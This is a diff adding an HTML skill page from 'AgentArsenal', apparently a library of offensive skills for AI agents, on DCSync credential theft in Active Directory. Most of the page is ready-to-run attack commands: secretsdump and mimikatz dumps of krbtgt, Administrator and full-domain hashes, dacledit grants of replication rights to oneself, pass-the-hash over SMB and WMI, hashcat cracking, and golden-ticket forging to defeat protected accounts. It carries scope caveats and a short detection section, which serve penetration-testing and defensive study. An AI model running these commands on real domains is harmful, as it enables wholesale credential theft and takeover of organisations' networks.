@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: dcsync</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>dcsync</h2><div class="meta"><span class="badge gray">ad</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when pulling Active Directory credential material through</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="ad-enumeration.html">ad-enumeration</a> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>impacket</td><td>0.12.0</td></tr><tr><td>mimikatz</td><td>2.2.0</td></tr><tr><td>NetExec</td><td>1.4.0</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>DCSync makes a domain controller hand over password hashes over the normal replication protocol (DRSUAPI), the same way a second domain controller would ask for them. Any account with the three replication rights (Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set) can pull the NTLM hash of any account in the domain, including krbtgt and Domain Admins. This skill covers the full authorized workflow for Active Directory assessments, lab environments, and CTFs only: confirming you have the rights, pulling targeted accounts, doing disciplined full dumps, granting the rights to yourself when you hold the right ACLs, and using the recovered hashes.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Confirm your account holds the replication rights on the domain</li>
+<p>object before you attempt anything.</p>
+<li>Start targeted: pull only the accounts the test plan needs (krbtgt,</li>
+<p>Administrator, or a specific service account).</p>
+<li>Save every pull to an output file so the evidence is reproducible.</li>
+<li>Only run a full domain pull when the scope explicitly allows it, and</li>
+<p>treat the output as the most sensitive file on your disk.</p>
+<li>Turn recovered NTLM hashes into access with pass the hash, without</li>
+<p>cracking first.</p>
+<li>Crack selectively offline when the report needs password strength</li>
+<p>findings.</p>
+<li>If you lack the rights, earn them through an ACL edge (dacledit) or a</li>
+<p>BloodHound path, then retry.</p>
+<li>Record every account pulled, the method, and where the output is</li>
+<p>stored.</p>
+</ol>
+<h2>1. Confirm replication rights</h2>
+<p>DCSync fails cleanly without the rights, so check first and save yourself a noisy failed attempt.</p>
+<pre><code class="language-bash"># Inspect the DACL of the domain object for replication rights
+nxc ldap 10.10.10.10 -u eviluser -p &#x27;Password1&#x27; \
+  -M daclread -o TARGET_DN=&#x27;DC=corp,DC=local&#x27;</code></pre>
+<p>Look for your account&#x27;s SID with rights mentioning replication or extended rights with the replication GUIDs. In BloodHound, the same check is visual: find your user, look for GetChanges and GetChangesAll edges to the domain object. The raw Cypher is:</p>
+<pre><code class="language-cypher">// Who can replicate (DCSync) the domain
+MATCH (n)-[:GetChanges|GetChangesAll]-&gt;(d:Domain)
+RETURN n.name</code></pre>
+<p>PowerView on Windows shows the same DACL:</p>
+<pre><code class="language-powershell"># Check for replication extended rights on the domain object
+Get-ObjectAcl -Identity &quot;DC=corp,DC=local&quot; | Where-Object {
+  $_.ActiveDirectoryRights -match &quot;ExtendedRight&quot;
+} | Select-Object SecurityIdentifier, ActiveDirectoryRights</code></pre>
+<h2>2. Targeted DCSync pulls</h2>
+<p>Pull one account at a time. Targeted pulls are quiet, fast, and easy to justify in the report.</p>
+<pre><code class="language-bash"># Pull only the krbtgt account (feeds the golden-ticket skill)
+secretsdump.py &#x27;corp.local/eviluser:Password1@10.10.10.10&#x27; \
+  -just-dc-user krbtgt -outputfile loot/krbtgt
+
+# Pull only the built in Administrator
+secretsdump.py &#x27;corp.local/eviluser:Password1@10.10.10.10&#x27; \
+  -just-dc-user administrator -outputfile loot/administrator
+
+# Pull a service account by sAMAccountName
+secretsdump.py &#x27;corp.local/eviluser:Password1@10.10.10.10&#x27; \
+  -just-dc-user svc_backup -outputfile loot/svc_backup</code></pre>
+<p>Mimikatz does the same from a Windows host with Domain Admin rights:</p>
+<pre><code class="language-text">privilege::debug
+lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:corp.local /user:administrator</code></pre>
+<p>The output line format is <code>domain\uid:rid:lmhash:nthash</code>, and the NTLM hash is the value after the third colon. That hash alone is enough for pass the hash, no cracking required.</p>
+<h2>3. Full domain pulls (scope permitting)</h2>
+<p>A full pull dumps every hash in the domain. Only do this when the rules of engagement allow it, and handle the file like a live credential vault.</p>
+<pre><code class="language-bash"># Full pull against one DC, saved to files
+secretsdump.py &#x27;corp.local/eviluser:Password1@10.10.10.10&#x27; \
+  -outputfile loot/full-dc01
+
+# Pull from a specific DC when several exist
+secretsdump.py &#x27;corp.local/eviluser:Password1@dc02.corp.local&#x27; \
+  -outputfile loot/full-dc02</code></pre>
+<p>Immediately restrict the output files, since they contain every password hash in the organization:</p>
+<pre><code class="language-bash">chmod 600 loot/full-dc01.ntds loot/full-dc01.secrets 2&gt;/dev/null
+ls -l loot/</code></pre>
+<p>At the end of the engagement, securely delete these files and confirm with the client that no copies remain on test systems.</p>
+<h2>4. Grant yourself replication rights</h2>
+<p>If you hold WriteDACL or GenericAll on the domain object (a common BloodHound edge), you can grant yourself the replication rights with impacket&#x27;s dacledit instead of finding another path to Domain Admin.</p>
+<pre><code class="language-bash"># Grant the three replication rights (the DCSync shortcut) to your user
+dacledit.py -action write -rights DCSync -principal eviluser \
+  -target-dn &quot;DC=corp,DC=local&quot; &quot;corp.local/eviluser:Password1@10.10.10.10&quot;
+
+# Verify the grant took effect
+nxc ldap 10.10.10.10 -u eviluser -p &#x27;Password1&#x27; \
+  -M daclread -o TARGET_DN=&#x27;DC=corp,DC=local&#x27; | grep -i -A2 eviluser</code></pre>
+<p>This changes the domain DACL, which is a loud and persistent change. Only do it when the test plan allows privilege escalation through ACL abuse, and record the exact change so the client can revert it. Reverting after the test is good practice:</p>
+<pre><code class="language-bash"># Remove the rights again when the test is done
+dacledit.py -action remove -rights DCSync -principal eviluser \
+  -target-dn &quot;DC=corp,DC=local&quot; &quot;corp.local/eviluser:Password1@10.10.10.10&quot;</code></pre>
+<h2>5. Use the recovered hashes</h2>
+<p>NTLM hashes authenticate directly. Cracking is optional and often unnecessary for the test objectives.</p>
+<pre><code class="language-bash"># Pass the hash over SMB (no password needed)
+nxc smb 10.10.10.10 -u administrator -H &lt;ntlm_hash&gt;
+
+# Pass the hash into secretsdump for a second pull
+secretsdump.py &#x27;corp.local/administrator@10.10.10.10&#x27; \
+  -hashes :&lt;ntlm_hash&gt; -just-dc-user krbtgt
+
+# Pass the hash into WinRM style execution
+wmiexec.py &#x27;corp.local/administrator@10.10.10.10&#x27; -hashes :&lt;ntlm_hash&gt;</code></pre>
+<pre><code class="language-bash"># Crack selectively for password strength findings
+hashcat -m 1000 loot/administrator.ntds /usr/share/wordlists/rockyou.txt --force</code></pre>
+<p>Feed the krbtgt hash into the golden-ticket skill when the test calls for ticket forging. Feed any Domain Admin hash into BloodHound re-collection, since full rights reveal the complete graph.</p>
+<h2>Edge cases</h2>
+<ul>
+<li><code>secretsdump.py</code> fails with access denied: you do not have the</li>
+<p>replication rights. Go back to section 1 and confirm, then earn the rights through an ACL edge before retrying.</p>
+<li>The target is a read only domain controller (RODC): DCSync against an</li>
+<p>RODC only returns the accounts it is allowed to cache. Target a writable DC instead.</p>
+<li>LDAP signing or channel binding breaks the connection: secretsdump</li>
+<p>handles signing automatically in recent impacket versions, but very old DCs may need <code>-use-vss</code> style local approaches instead.</p>
+<li>The pull hangs halfway: large domains are slow. Use <code>-just-dc-user</code></li>
+<p>for what you need instead of full pulls, and target the closest DC.</p>
+<li>Output shows <code>aad3b435b51404eeaad3b435b51404ee</code> as the LM hash: that</li>
+<p>is the empty LM placeholder, normal on modern domains. The NTLM hash after it is what matters.</p>
+<li>mimikatz <code>lsadump::dcsync</code> returns nothing: run <code>privilege::debug</code></li>
+<p>first, and confirm you are running as a Domain Admin equivalent.</p>
+<li>dacledit grant succeeds but DCSync still fails: replication rights can</li>
+<p>take time to apply, and Deny ACEs override Allow. Re-read the DACL to confirm the effective rights.</p>
+<li>Defender for Identity or similar sees the pull in real time on a</li>
+<p>monitored engagement: coordinate timing with the client contact so a DCSync alert does not trigger their incident process unexpectedly.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No replication rights and no WriteDACL: work the BloodHound graph for</li>
+<p>another path to Domain Admin (the bloodhound-methodology skill), since DCSync is usually the end of a path, not the start.</p>
+<li>You have a DC backup (ntds.dit + SYSTEM hive): extract hashes offline</li>
+<p>with secretsdump.py in local mode instead of DCSync.</p>
+<li>Replication ports blocked by firewall: DCSync needs RPC to the DC.</li>
+<p>Pivot through a host with DC connectivity (network-pivoting skill) rather than fighting the firewall.</p>
+<li>The account you want is protected by AdminSDHolder or is in Protected</li>
+<p>Users: pull the krbtgt hash instead and forge a golden ticket, which bypasses per account protections.</p>
+<li>You need persistence beyond the test window: stop. Document the</li>
+<p>DCSync capability as the finding and let the client own remediation. Planting persistence is outside authorized test scope.</p>
+<li>Shadow credentials (msDS-KeyCredentialLink) as an alternative: if you</li>
+<p>hold GenericWrite on a computer object, Whisker or pywhisker gives you that machine&#x27;s TGT without touching replication rights at all.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see DCSync as Event ID 4662 on the domain controller with the replication GUIDs (DS-Replication-Get-Changes and related) in the access mask, requested by an account that is not a domain controller. Microsoft Defender for Identity raises a dedicated DCSync alert on exactly this pattern. Honeypot admin accounts make detection trivial, because any replication request touching them is malicious by definition. The durable fixes are: keep Domain Admin membership minimal, never delegate replication rights broadly, alert on 4662 with replication GUIDs from non DC accounts, and after any suspected DCSync, reset the krbtgt account twice and rotate every credential the pulled hashes could reach. There is no way to unsee a stolen hash, so rotation is the only real remediation.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1003.006 (OS Credential Dumping: DCSync).</li>
+<li>Impacket secretsdump.py documentation:</li>
+<p>https://github.com/fortra/impacket/tree/master/examples</p>
+<li>Impacket dacledit.py documentation:</li>
+<p>https://github.com/fortra/impacket/tree/master/examples</p>
+<li>mimikatz lsadump::dcsync documentation:</li>
+<p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</p>
+<li>Microsoft documentation on directory replication rights and the</li>
+<p>krbtgt account.</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
